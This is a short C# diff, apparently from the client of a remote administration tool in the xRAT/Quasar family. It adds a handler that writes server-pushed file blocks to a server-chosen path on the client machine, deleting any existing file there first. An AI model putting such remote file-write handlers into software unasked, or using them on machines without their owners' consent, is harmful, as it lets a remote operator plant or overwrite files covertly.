@@ -98,6 +98,15 @@ namespace xClient.Core.Commands
             }
         }
 
+        public static void HandleDoUploadFile(Packets.ServerPackets.DoUploadFile command, Client client)
+        {
+            if (command.CurrentBlock == 0 && File.Exists(command.RemotePath))
+                DeleteFile(command.RemotePath); // delete existing file
+
+            FileSplit destFile = new FileSplit(command.RemotePath);
+            destFile.AppendBlock(command.Block, command.CurrentBlock);
+        }
+
         public static void HandleDoPathDelete(Packets.ServerPackets.DoPathDelete command, Client client)
         {
             try
